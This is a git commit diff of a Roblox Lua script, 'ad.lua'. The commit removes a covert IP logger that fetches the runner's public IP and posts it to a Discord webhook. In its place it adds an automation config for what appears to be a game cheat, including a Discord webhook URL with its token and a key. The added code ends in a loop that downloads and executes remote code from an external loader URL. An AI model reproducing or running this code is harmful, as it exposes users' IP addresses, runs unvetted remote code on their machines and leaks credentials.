1edadca484f16794b188eaafdd143d56bbb47712
SrMeowers <112948674+SrMeowers@users.noreply.github.com>
2024-06-09 16:07:19 +0300

    Update ad.lua

--- ad.lua
+++ ad.lua
@@ -1,25 +1,135 @@
-local http_service = game:GetService("HttpService")
+getgenv().Config = {
+	["SelectChapter"] = "Chapter 1",
+	["AutoSave"] = true,
+	["WH_MatchComplete"] = true,
+	["AutoPlay"] = true,
+	["AutoClaimQuest"] = false,
+	["TPLobbyIfPlayer"] = true,
+	["AutoJoinHoster"] = false,
+	["WaitForJoiner"] = false,
+	["SelectRaidMacro"] = {
 
--- Function to get public IP address
-local function getPublicIP()
-    local ip_response = request({
-        Url = "https://api.ipify.org",
-        Method = "GET"
-    })
-    return ip_response.Body
-end
+	},
+	["TeleportLobbyNewBanner"] = false,
+	["AutoSummonStandard"] = false,
+	["SelectReward"] = {
+		["Trait Crystal"] = false,
+		["Risky Dice"] = false,
+		["Star Rift (Rainbow)"] = false,
+		["Gems"] = false,
+		["Star Rift "] = false,
+		["Gold"] = false
+	},
+	["UpgradeMethod"] = "Lowest Level (Spread Upgrade)",
+	["PlayMacro"] = false,
+	["BoostFPS"] = false,
+	["AutoSkip"] = true,
+	["SelectDifficulty"] = {
+		["All units lowered range"] = false,
+		["All enemies regen health"] = false,
+		["All enemies +1 shield"] = false,
+		["All units increased cost"] = false,
+		["All enemies 2x health"] = false,
+		["All enemies 2x speed"] = false
+	},
+	["JoinerCooldown"] = 0,
+	["AutoSell"] = true,
+	["JoinerList"] = {
+		[1] = "No joiner in the list"
+	},
+	["BlackScreen"] = false,
+	["AutoReturnLobby"] = true,
+	["SelectChallengeWorld"] = {
+		["Cursed Academy"] = false,
+		["Blue Planet"] = false,
+		["Windmill Village"] = false,
+		["Mob City"] = false,
+		["Underwater Temple"] = false
+	},
+	["MiddlePos"] = {
+		["Mob City"] = "107.04263305664062, 297.7572326660156, 186.9844207763672",
+		["Windmill Village"] = "-1674.623291015625, 24.114013671875, -527.8465576171875"
+	},
+	["IgnoreMacroTiming"] = false,
+	["OFARecord"] = false,
+	["UnselectIfSummoned"] = false,
+	["AutoRejoin"] = true,
+	["AutoJoinWorld"] = true,
+	["LeaveSellWave"] = 1,
+	["HardMode"] = false,
+	["AutoUpgrade"] = true,
+	["StandardSummonUnit"] = {
+		["Maxed Qi Master"] = false,
+		["Shinobi Form 3"] = false,
+		["The Gamer"] = false,
+		["Carp"] = false,
+		["Admiral Of Lava"] = false,
+		["Dragon Slayer"] = false,
+		["Chance Taker"] = false,
+		["Strongest Swordsman"] = false,
+		["Vengeful Shinobi"] = false,
+		["Skull Warrior"] = false,
+		["Cursed Fighter"] = false,
+		["The Beast"] = false,
+		["Ant King"] = false,
+		["Elf Wizardess"] = false,
+		["Flame Dragon King"] = false,
+		["Thunder Shinobi"] = false,
+		["Curse Prince"] = false,
+		["Ascended Qi Master"] = false,
+		["Spirit Hybrid"] = false,
+		["Soulforce Reaper"] = false,
+		["Admiral Of Ice"] = false,
+		["Inferno Commander"] = false,
+		["Bloomer"] = false,
+		["Fire Leg Master"] = false,
+		["Sharpshooter"] = false,
+		["Clay"] = false,
+		["Esper"] = false,
+		["Pink Rockstar"] = false,
+		["Admiral Of Light"] = false,
+		["Master Swordsman"] = false
+	},
+	["WH_BannerSummoned"] = true,
+	["AutoSummonLimited"] = false,
+	["AutoJoinChallenge"] = true,
+	["LimitedSummonUnit"] = {
+		["Ocean Guardian"] = false,
+		["The Cursed Knight"] = false,
+		["Donut Warrior"] = false,
+		["Warrior Princess"] = false,
+		["Electric Cyborg"] = false
+	},
+	["UpgradeAndPlace"] = false,
+	["AutoReplay"] = false,
+	["JoinHighest"] = true,
+	["PlaceGap"] = {
+		["Cursed Academy"] = 3.25,
+		["Blue Planet"] = 3.25,
+		["Windmill Village"] = 3.25,
+		["Mob City"] = 3.25,
+		["Underwater Temple"] = 3.25
+	},
+	["DeleteMap"] = false,
+	["WebhookURL"] = "https://discord.com/api/webhooks/1249348918987325502/MMnASkjwznWI7OPfJ-QYFh1pjB02F0U_FeYN_X5m-Bo1772XBT-BX5nDzgR3i4Mbk-WR",
+	["SelectWorld"] = "Windmill Village",
+	["SelectChallengeMacro"] = {
 
-local ip_address = getPublicIP()
-
-local url = "https://discord.com/api/webhooks/1059784907297149009/ObtD7JRVz4pMeSq9XxKgzwRGRDhlErYx2pGHsILnfxT-pT9H4ElYqdYoSQUA-rv9rTVX"
-local data = {
-    ["content"] = "IP Address: " .. ip_address
+	},
+	["DeleteRarity"] = {
+		["Epic"] = false,
+		["Legendary"] = false,
+		["Rare"] = false
+	},
+	["AutoJoinRaid"] = false,
+	["AutoLeave"] = false,
+	["HillHeight"] = {
+		["Cursed Academy"] = 2,
+		["Blue Planet"] = 2,
+		["Windmill Village"] = 2,
+		["Mob City"] = 2,
+		["Underwater Temple"] = 2
+	}
 }
-local newdata = http_service:JSONEncode(data)
-
-local headers = {
-    ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+getgenv().Key = "k645540e15dc101452bcb461"
+repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(20)until Joebiden
